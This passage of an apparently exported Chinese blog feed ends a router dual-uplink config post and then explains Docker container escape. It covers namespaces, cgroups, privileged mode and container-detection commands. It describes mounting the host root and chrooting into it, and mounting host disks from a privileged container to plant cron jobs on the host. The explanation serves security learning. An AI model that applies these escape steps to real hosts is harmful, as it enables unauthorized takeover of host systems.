class=\"code\"><pre><span class=\"line\">acl number 2000</span><br><span class=\"line\">rule permit source 0.0.0.1 255.255.255.254</span><br><span class=\"line\">#</span><br><span class=\"line\">policy-based-route mypbr permit node 5</span><br><span class=\"line\">if-match acl 2000</span><br><span class=\"line\">apply ip-address next-hop 联通网关</span><br><span class=\"line\">#</span><br><span class=\"line\">interface vlan-interface1</span><br><span class=\"line\">ip address 192.168.1.1 255.255.255.0</span><br><span class=\"line\">ip policy-based-route mypbr</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 电信网关</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 联通网关 preference 80</span><br></pre></td></tr></table></figure>\n<p>2.DNS 选路</p>\n<p>和上面的案例一样，只不过由于我们这次可以在内网控制，我们不一定要依赖运营商的 DNS 解析，比如学校里我们可以使用自己的 DNS 解析一部分地址，将其解析到空闲的链路上</p>\n<p>3. 控制 preference</p>\n<p>ip route-static 0.0.0.0 0 192.168.1.254 preference 10</p>\n<p>将希望优先选择的链路优先级改小，实现优先选路</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaDNjLmNvbS9jbi9kXzIwMTAxMC82OTc2NjRfOTc2NjVfMC5odG0=\">技术点详解 — 互联网双出口的选择 - IP 技术专栏 - 技术甜甜圈 - 新华三集团 - H3C</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3JhenltYWtlcmNpcmNsZS9wLzE0OTc2NjEyLmh0bWwjYXV0b2lkLWgzLTExLTAtNg==\">DNS 图解（秒懂 - 史上最全） - 疯狂创客圈 - 博客园 (cnblogs.com)</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/11/27/Docker%E9%80%83%E9%80%B8/",
            "url": "http://example.com/2022/11/27/Docker%E9%80%83%E9%80%B8/",
            "title": "docker逃逸&capabilities",
            "date_published": "2022-11-27T05:38:45.000Z",
            "content_html": "<h1 id=\"docker逃逸-反弹shellcapabilities\"><a class=\"markdownIt-Anchor\" href=\"#docker逃逸-反弹shellcapabilities\">#</a> Docker 逃逸、反弹 shell，capabilities</h1>\n<h2 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h2>\n<h3 id=\"1linux-namespace\"><a class=\"markdownIt-Anchor\" href=\"#1linux-namespace\">#</a> 1.Linux NameSpace</h3>\n<p>Linux Namespace 是 Linux 提供的一种<strong>内核级别环境隔离</strong>的方法。从 Unix 开始，有一个 chroot 命令，</p>\n<p>chroot</p>\n<blockquote>\n<p>change root directory (更改 root 目录)。在 linux 系统中，系统默认的目录结构都是以  <code>/</code> ，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为  <code>/</code>  位置。</p>\n</blockquote>\n<p>也就是说，原先我们的 root 目录在 /，那么我们在 tmp 目录使用 chroot 后，那么我们的 / 目录就在 tmp / 下，在 docker 中有一种逃逸方式，在 docker 启动的时候，挂在宿主机的根目录，假设，启动时，把宿主机的根目录挂载在了 docker 中的 / UzJu / 目录</p>\n<p><code>docker run -it -v /:/uzju/ ubuntu:18.04</code></p>\n<p>那么此时，我们进入到 docker 中，使用 chroot，将根目录切换至 / UzJu / 目录下</p>\n<p><code>chroot /uzju/</code></p>\n<p>此时我们就可以使用 crontab 等多种方式获取宿主机权限</p>\n<p>那么 chroot 提供的就是一种简单的隔离环境，chroot 内部的内容无法访问外部的，Linux NameSpace 在这个基础上，又提供了对以下内容的隔离机制</p>\n<ul>\n<li>UTS</li>\n<li>IPC</li>\n<li>mount</li>\n<li>PID</li>\n<li>network</li>\n<li>User</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">| Mount namespaces | CLONE_NEWNS | Linux内核2.4.19 |</span><br><span class=\"line\">| ---------------------- | -------------- | ------------------------- |</span><br><span class=\"line\">| UTS Namespaces | CLONE_NEWUTS | Linux内核2.6.19 |</span><br><span class=\"line\">| IPC NameSpaces | CLONE_NEWIPC | Linux内核2.6.19 |</span><br><span class=\"line\">| PID namespaces | CLONE_NEWPID | Linux内核2.6.24 |</span><br><span class=\"line\">| Network namespaces | CLONE_NEWNET | Linux内核2.6.24-&gt;2.6.29 |</span><br><span class=\"line\">| User namespaces | CLONE_NEWUSER | Linux内核2.6.23 |</span><br></pre></td></tr></table></figure>\n<p>在 Linux 文档中我们可以看到，目前，Linux 实现了六种不同类型的命名空间。每个命名空间的目的是将特定的全局系统资源包装在一个抽象中，使命名空间内的进程看起来拥有自己的全局资源隔离实例。命名空间的总体目标之一是支持容器的实现，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzUyNDk1Mi8=\">容器</span>是一种用于轻量级虚拟化（以及其他目的）的工具，它为一组进程提供了它们是系统上唯一进程的错觉。</p>\n<h3 id=\"2linux-cgroup\"><a class=\"markdownIt-Anchor\" href=\"#2linux-cgroup\">#</a> 2.Linux Cgroup</h3>\n<p>虽然 NameSpace 解决了环境隔离上的问题，但是并没有解决主机上资源的隔离，虽然可以通过 NameSpace 把单个容器关到一个特定的环境中，但是单个容器对其中的进程使用的 CPU，内存，磁盘等这些计算资源其实都是可以操作的，所以对进程进行资源上的限制或者控制，这就 Linux Cgroup 的作用</p>\n<p>Linux CGroup 全称 Linux Control Group， 是 Linux 内核的一个功能，用来限制，控制与分离一个进程组群的资源（如 CPU、内存、磁盘输入输出等）。</p>\n<p>Linux Cgroup 主要提供以下功能</p>\n<blockquote>\n<p>1、Resource limitation：限制资源的使用</p>\n<ul>\n<li>例如：内存使用上限以及文件系统的缓存限制</li>\n</ul>\n<p>2、Prioritization：优先级控制</p>\n<ul>\n<li>例如：CPU 利用和磁盘的 IO 吞吐</li>\n</ul>\n<p>3、Accounting 一些审计和一些统计</p>\n<p>4、Control</p>\n<ul>\n<li>挂起进程，恢复执行进程</li>\n</ul>\n</blockquote>\n<p><strong>Cgroup 主要限制的资源</strong></p>\n<ul>\n<li>CPU</li>\n<li>内存</li>\n<li>网络</li>\n<li>磁盘 I/O</li>\n</ul>\n<p>Cgroup 子系统</p>\n<p>cgroups 的全称是 control groups，cgroups 为每种可以控制的资源定义了一个子系统。典型的子系统介绍如下：</p>\n<blockquote>\n<ol>\n<li>cpu 子系统，主要限制进程的 cpu 使用率。</li>\n<li>cpuacct 子系统，可以统计 cgroups 中的进程的 cpu 使用报告。</li>\n<li>cpuset 子系统，可以为 cgroups 中的进程分配单独的 cpu 节点或者内存节点。</li>\n<li>memory 子系统，可以限制进程的 memory 使用量。</li>\n<li>blkio 子系统，可以限制进程的块设备 io。</li>\n<li>devices 子系统，可以控制进程能够访问某些设备。</li>\n<li>net_cls 子系统，可以标记 cgroups 中进程的网络数据包，然后可以使用 tc 模块（traffic control）对数据包进行控制。</li>\n<li>freezer 子系统，可以挂起或者恢复 cgroups 中的进程。</li>\n<li>ns 子系统，可以使不同 cgroups 下面的进程使用不同的 namespace。</li>\n</ol>\n</blockquote>\n<p>Cgroup 在什么时候创建</p>\n<p>Linux 内核通过一个叫做 cgroupfs 的伪文件系统来提供管理 cgroup 的接口，我们可以通过 lscgroup 命令来列出系统中已有的 cgroup，该命令实际上遍历了 /sys/fs/cgroup/ 目录中的文件:</p>\n<p><code>lscgroup | tee cgroup.a</code></p>\n<p>Cgroup 限制资源访问</p>\n<p>如果安装 docker 之后，在每个子系统下都会有一个 docker 的目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos docker]# pwd</span><br><span class=\"line\">/sys/fs/cgroup/cpu/docker</span><br><span class=\"line\">[root@VM-16-11-centos docker]# ls -al</span><br><span class=\"line\">total 0</span><br><span class=\"line\">drwxr-xr-x 7 root root 0 Nov 27 10:44 .</span><br><span class=\"line\">drwxr-xr-x 6 root root 0 Mar 22  2022 ..</span><br><span class=\"line\">drwxr-xr-x 2 root root 0 Sep  5 00:40 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649</span><br><span class=\"line\">drwxr-xr-x 2 root root 0 Sep  4 12:33 4ef7dbc2052fcda8d703d7676bd929e12d9f444d95e42624caa68a83246e37d9</span><br><span class=\"line\">drwxr-xr-x 2 root root 0 Sep  5 00:40 91fb044dac907328965ae3e4813a1ce0c57ead57a30f00cb1aaabbb29d2598bd</span><br><span class=\"line\">drwxr-xr-x 2 root root 0 Sep  4 12:21 ac016bd93be4a5955fffc8fd108580930fae2266eec95bab966d0a65197f5e40</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 cgroup.clone_children</span><br><span class=\"line\">--w--w--w- 1 root root 0 Apr 17  2022 cgroup.event_control</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 cgroup.procs</span><br><span class=\"line\">-r--r--r-- 1 root root 0 Apr 17  2022 cpuacct.stat</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 cpuacct.usage</span><br><span class=\"line\">-r--r--r-- 1 root root 0 Apr 17  2022 cpuacct.usage_percpu</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.cfs_period_us</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.cfs_quota_us</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.rt_period_us</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.rt_runtime_us</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.shares</span><br><span class=\"line\">-r--r--r-- 1 root root 0 Apr 17  2022 cpu.stat</span><br><span class=\"line\">drwxr-xr-x 2 root root 0 Sep  4 12:32 ea2618b4f0bd98b8d0326c98d9edae2e8ee9ad911b4356901b0eac429f0e7996</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 notify_on_release</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Apr 17  2022 tasks</span><br></pre></td></tr></table></figure>\n<p>其中的 3b63 等都是 docker 容器，启动这个容器时，Docker 会为这个容器创建一个与容器标识符相同的 CGroup，在当前的主机上 CGroup 就会有以下的层级关系：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/UzJuMarkDownImage1bf68aab2e78dfa6ab6df817e1d83e3c.png\" alt=\"\"></p>\n<p>每一个 CGroup 下面都有一个 tasks 文件，其中存储着属于当前控制组的所有进程的 pid，作为负责 cpu 的子系统，cpu.cfs_quota_us 文件中的内容能够对 CPU 的使用作出限制，如果当前文件的内容为 50000，那么当前控制组中的全部进程的 CPU 占用率不能超过 50%。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# pwd</span><br><span class=\"line\">/sys/fs/cgroup/cpu/docker/3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649</span><br><span class=\"line\">[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# ls -al</span><br><span class=\"line\">total 0</span><br><span class=\"line\">drwxr-xr-x 2 root root 0 Sep  5 00:40 .</span><br><span class=\"line\">drwxr-xr-x 7 root root 0 Nov 27 10:44 ..</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 cgroup.clone_children</span><br><span class=\"line\">--w--w--w- 1 root root 0 Sep  5 00:40 cgroup.event_control</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 cgroup.procs</span><br><span class=\"line\">-r--r--r-- 1 root root 0 Sep  5 00:40 cpuacct.stat</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpuacct.usage</span><br><span class=\"line\">-r--r--r-- 1 root root 0 Sep  5 00:40 cpuacct.usage_percpu</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.cfs_period_us</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.cfs_quota_us</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.rt_period_us</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.rt_runtime_us</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.shares</span><br><span class=\"line\">-r--r--r-- 1 root root 0 Sep  5 00:40 cpu.stat</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 notify_on_release</span><br><span class=\"line\">-rw-r--r-- 1 root root 0 Sep  5 00:40 tasks</span><br><span class=\"line\">[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# cat cpu.cfs_quota_us </span><br><span class=\"line\">-1</span><br></pre></td></tr></table></figure>\n<p>cgroup 支持文件种类</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1648779855-579587-image.png\" alt=\"img\"></p>\n<p>Linux 的 NameSpace 和 Cgroup 分别解决了不同资源隔离的问题，前者解决了进程、网络以及文件系统的隔离，后者实现了 CPU、内存等资源的隔离。</p>\n<p><strong>docker 的实现原理</strong></p>\n<p><strong>其实 docker 就是一个 linux 下的进程，通过 Linux NameSpaces 对不同的容器进行隔离，为了保证宿主机与容器资源上的隔离，与资源占用的比例，所有使用 Cgroup 对进程进行资源上的限制或者控制</strong></p>\n<h3 id=\"3特权模式\"><a class=\"markdownIt-Anchor\" href=\"#3特权模式\">#</a> 3. 特权模式</h3>\n<p>启动特权模式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --privileged nginx /bin/bash</span><br></pre></td></tr></table></figure>\n<p>k8s 中，在 pod 的 yaml 配置中添加如下配置时，也会以特权模式启动容器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">securityContext:</span><br><span class=\"line\">  privileged: true</span><br></pre></td></tr></table></figure>\n<p>特权模式与非特权模式</p>\n<p>1.linux capabilities</p>\n<blockquote>\n<p>普通模式下容器内进程只可以使用有限的一些 linux capabilities:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run --rm -it  r.j3ss.co/amicontained bash</span><br><span class=\"line\"></span><br><span class=\"line\">Status: Downloaded newer image for r.j3ss.co/amicontained:latest</span><br><span class=\"line\">Container Runtime: docker</span><br><span class=\"line\">Has Namespaces:</span><br><span class=\"line\">\tpid: true</span><br><span class=\"line\">\tuser: false</span><br><span class=\"line\">AppArmor Profile: unconfined</span><br><span class=\"line\">Capabilities:</span><br><span class=\"line\">\tBOUNDING -&gt; chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap</span><br><span class=\"line\">Seccomp: filtering</span><br><span class=\"line\">Blocked Syscalls (64):</span><br><span class=\"line\">\tMSGRCV PTRACE SYSLOG SETPGID SETSID USELIB USTAT SYSFS VHANGUP PIVOT_ROOT _SYSCTL ACCT SETTIMEOFDAY MOUNT UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME IOPL IOPERM CREATE_MODULE INIT_MODULE DELETE_MODULE GET_KERNEL_SYMS QUERY_MODULE QUOTACTL NFSSERVCTL GETPMSG PUTPMSG AFS_SYSCALL TUXCALL SECURITY LOOKUP_DCOOKIE CLOCK_SETTIME VSERVER MBIND SET_MEMPOLICY GET_MEMPOLICY KEXEC_LOAD ADD_KEY REQUEST_KEY KEYCTL MIGRATE_PAGES UNSHARE MOVE_PAGES PERF_EVENT_OPEN FANOTIFY_INIT NAME_TO_HANDLE_AT OPEN_BY_HANDLE_AT SETNS PROCESS_VM_READV PROCESS_VM_WRITEV KCMP FINIT_MODULE KEXEC_FILE_LOAD BPF USERFAULTFD PREADV2 PWRITEV2 PKEY_MPROTECT PKEY_ALLOC PKEY_FREE</span><br></pre></td></tr></table></figure>\n<p>但是，特权模式下的容器内进程可以使用所有的 linux capabilities:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run --privileged --rm -it  r.j3ss.co/amicontained bash</span><br><span class=\"line\"></span><br><span class=\"line\">Container Runtime: docker</span><br><span class=\"line\">Has Namespaces:</span><br><span class=\"line\">\tpid: true</span><br><span class=\"line\">\tuser: false</span><br><span class=\"line\">AppArmor Profile: unconfined</span><br><span class=\"line\">Capabilities:</span><br><span class=\"line\">\tBOUNDING -&gt; chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend</span><br><span class=\"line\">Seccomp: disabled</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>特权模式下，容器内进程拥有使用所有的 linux capabilities 的能力，但是， 不表示进程就一定有使用某些 linux capabilities 的权限。比如，如果容器是以非 root 用户启动的， 就算它是以特权模式启动的容器，也不表示它就能够做一些无权限做的事情:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run --rm -it debian:buster chown 65534 /var/log/lastlog</span><br><span class=\"line\"></span><br><span class=\"line\">$ docker run -u 65534 --rm -it debian:buster chown 65534 /var/log/lastlog</span><br><span class=\"line\">chown: changing ownership of &#x27;/var/log/lastlog&#x27;: Operation not permitted</span><br><span class=\"line\"></span><br><span class=\"line\">$ docker run --privileged -u 65534 --rm -it debian:buster chown 65534 /var/log/lastlog</span><br><span class=\"line\">chown: changing ownership of &#x27;/var/log/lastlog&#x27;: Operation not permitted&#x27;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ol start=\"2\">\n<li></li>\n</ol>\n<blockquote>\n<p>普通模式下，部分内核模块路径比如 /proc 下的一些目录需要阻止写入、有些又需要允许读写， 这些文件目录将会以 tmpfs 文件系统的方式挂载到容器中，以实现目录 mask 的需求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run --rm -it debian:buster mount |grep &#x27;/proc.*tmpfs&#x27;</span><br><span class=\"line\">tmpfs on /proc/acpi type tmpfs (ro,relatime)</span><br><span class=\"line\">tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)</span><br></pre></td></tr></table></figure>\n<p>特权模式下，这些目录将不再以 tmpfs 文件系统的方式挂载:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run --privileged --rm -it debian:buster mount |grep &#x27;/proc.*tmpfs&#x27;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ol start=\"3\">\n<li></li>\n</ol>\n<blockquote>\n<p>普通模式下，部分内核文件系统 (sysfs、procfs) 会被以只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run --rm -it debian:buster mount |grep &#x27;(ro&#x27;</span><br><span class=\"line\">sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)</span><br><span class=\"line\">cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)</span><br><span class=\"line\">cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)</span><br></pre></td></tr></table></figure>\n<p>但是在特权模式下，内核文件系统将不再以只读的方式被挂载:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run --privileged --rm -it debian:buster mount |grep &#x27;(ro&#x27;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ol start=\"4\">\n<li></li>\n</ol>\n<blockquote>\n<p>普通模式下，可以通过配置 AppArmor 或 Seccomp 相关安全选项 （如果未配置的话，容器引擎默认也会启用一些对应的默认配置） 对容器进行加固:</p>\n<p>特权模式下，这些 AppArmor 或 Seccomp 相关配置将不再生效:</p>\n<p>普通模式下也可以通过对应的安全选项来禁用 AppArmor 或 Seccomp 特性。</p>\n</blockquote>\n<ol start=\"5\">\n<li></li>\n</ol>\n<blockquote>\n<p>默认模式下，只能以只读模式操作 cgroup</p>\n<p>特权模式下，将可以对 cgroup 进行读写操作:</p>\n</blockquote>\n<ol start=\"6\">\n<li></li>\n</ol>\n<blockquote>\n<p>普通模式下，容器内 /dev 目录下看不到节点 /dev 目录下特有的 devices</p>\n<p>特权模式下，容器内的 /dev 目录会包含这些来自节点 /dev 目录下的那些内容:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run --privileged --rm -it debian:buster ls /dev</span><br><span class=\"line\">autofs           mapper              stdin   tty25  tty44  tty63    vcsa1</span><br><span class=\"line\">btrfs-control    mcelog              stdout  tty26  tty45  tty7     vcsa2</span><br><span class=\"line\">bus              mem                 tty     tty27  tty46  tty8     vcsa3</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ol start=\"7\">\n<li></li>\n</ol>\n<blockquote>\n<p>特权模式下，SELinux 相关的安全加固配置将被禁用。</p>\n<p>普通模式下也可以通过对应的安全选项来禁用 SELinux 特性。</p>\n</blockquote>\n<p>特权模式于版本 6.0 时被引入 Docker，允许容器内的 root 拥有外部物理机 root 权限，而此前容器内 root 用户仅拥有外部物理机普通用户权限。</p>\n<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行 docker run --privileged 时，Docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载。</p>\n<p>当控制使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb3ppbGxhemcuY29tLzIwMjEvMTEvZG9ja2VyLWNvbnRhaW5lci1kaWZmZXJlbmNlLWJldHdlZW4tcHJpdmlsZWdlZC1tb2RlLWFuZC1ub24tcHJpdmlsZWdlZC1tb2RlLmh0bWw=\">容器特权模式与非特权模式的区别 - mozillazg’s Blog</span></p>\n<h3 id=\"4docker-环境判断\"><a class=\"markdownIt-Anchor\" href=\"#4docker-环境判断\">#</a> 4.docker 环境判断</h3>\n<p>1. 根据.dockerenv 判断</p>\n<p>非 docker 环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# ls -al /.dockerenv</span><br><span class=\"line\">ls: cannot access /.dockerenv: No such file or directory</span><br></pre></td></tr></table></figure>\n<p>docker 环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@9b14f6362056:/# ls -al /.dockerenv </span><br><span class=\"line\">-rwxr-xr-x 1 root root 0 Nov 27 03:33 /.dockerenv</span><br></pre></td></tr></table></figure>\n<p>2. 根据从 group 信息</p>\n<p>非 docker 环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos ~]# cat /proc/1/cgroup </span><br><span class=\"line\">11:hugetlb:/</span><br><span class=\"line\">10:freezer:/</span><br><span class=\"line\">9:devices:/</span><br><span class=\"line\">8:cpuset:/</span><br><span class=\"line\">7:blkio:/</span><br><span class=\"line\">6:cpuacct,cpu:/</span><br><span class=\"line\">5:pids:/</span><br><span class=\"line\">4:perf_event:/</span><br><span class=\"line\">3:memory:/</span><br><span class=\"line\">2:net_prio,net_cls:/</span><br><span class=\"line\">1:name=systemd:/</span><br></pre></td></tr></table></figure>\n<p>docker 环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@9b14f6362056:/# cat /proc/1/cgroup </span><br><span class=\"line\">11:hugetlb:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">10:freezer:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">9:devices:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">8:cpuset:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">7:blkio:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">6:cpuacct,cpu:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">5:pids:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">4:perf_event:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">3:memory:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class=\"line\">2:net_prio,net_cls:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span 